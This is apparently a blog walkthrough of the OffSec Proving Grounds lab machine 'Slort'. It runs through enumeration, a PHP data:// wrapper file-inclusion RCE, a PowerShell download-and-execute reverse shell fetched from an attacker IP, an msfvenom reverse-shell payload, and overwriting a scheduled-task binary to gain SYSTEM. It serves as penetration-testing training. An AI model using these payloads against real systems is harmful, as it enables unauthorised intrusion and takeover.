---
title: "PG: Slort"
date: 2022-11-22
draft: false
os: "Windows"
difficulty: "Medium"
platform: "OffSec Proving Grounds"
aliases: ["/posts/offsec/slort/"]
tags:
  - offsec
  - proving-grounds
  - medium
  - windows
  - lfi
  - rfi
  - php-wrapper
  - scheduled-task
  - xampp
categories:
  - walkthrough
---

{{< box-info name="Slort" os="Windows" difficulty="Medium" ip="192.168.105.53" platform="OffSec Proving Grounds" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     FileZilla ftpd 0.9.41 beta
135/tcp  open  msrpc   Microsoft Windows RPC
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql   MariaDB (host not allowed)
4443/tcp open  http    Apache httpd 2.4.43 (XAMPP)
8080/tcp open  http    Apache httpd 2.4.43 (XAMPP)
```
{{< /collapse >}}

Windows box running XAMPP on two ports. FTP requires credentials, MySQL is localhost-only.

### Port 8080 - XAMPP Web App

Directory fuzzing and manual crawling reveals an interesting endpoint:

```
http://192.168.105.53:8080/site/index.php?page=main.php
```

The `page` parameter smells like file inclusion.

---

## Foothold

### PHP Wrapper RCE

The `page` parameter is vulnerable to LFI, RFI, and PHP wrappers. The `data://` wrapper gives direct code execution:

```
http://192.168.105.53:8080/site/index.php?page=data:text/plain,<?php echo shell_exec("whoami") ?>
```

For a proper shell, use the wrapper to download and execute a Nishang reverse shell in memory. URL-encode the payload and send via Burp:

```
GET /site/index.php?page=data:text/plain,<?php+echo+shell_exec("powershell.exe+-nop+-exec+bypass+IEX+(IWR+http%3a//192.168.49.105/Invoke-PowerShellTcp.ps1+-UseBasicParsing)")+?> HTTP/1.1
```

Shell as `rupert` -- unprivileged user with no interesting permissions.

---

## Privilege Escalation

### Scheduled Task Binary Replacement

Poking around the filesystem reveals `C:\backup\` containing a binary (`TFTP.EXE`) and a text file explaining it runs every 5 minutes as a scheduled task.

Replace it with a reverse shell:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.105 LPORT=4466 -f exe > pwn.exe
```

```powershell
# Download and overwrite the scheduled binary
IWR http://192.168.49.105/pwn.exe -UseBasicParsing -o C:\backup\TFTP.EXE
```

Wait for the task to fire, catch a SYSTEM shell.

---

## Proof

{{< terminal title="root@slort" >}}
whoami
nt authority\system
{{< /terminal >}}

---

## Key Takeaways

{{< callout type="note" >}}
- When you see `?page=` or `?file=` parameters in PHP apps, always test for LFI/RFI and PHP wrappers (`data://`, `php://`)
- The `data://` wrapper is often overlooked but provides clean one-shot RCE without needing to upload files
- Always check for writable scheduled task binaries -- `C:\backup\` and similar directories are prime targets
- Don't forget to check XAMPP default configs and directories on Windows boxes
{{< /callout >}}
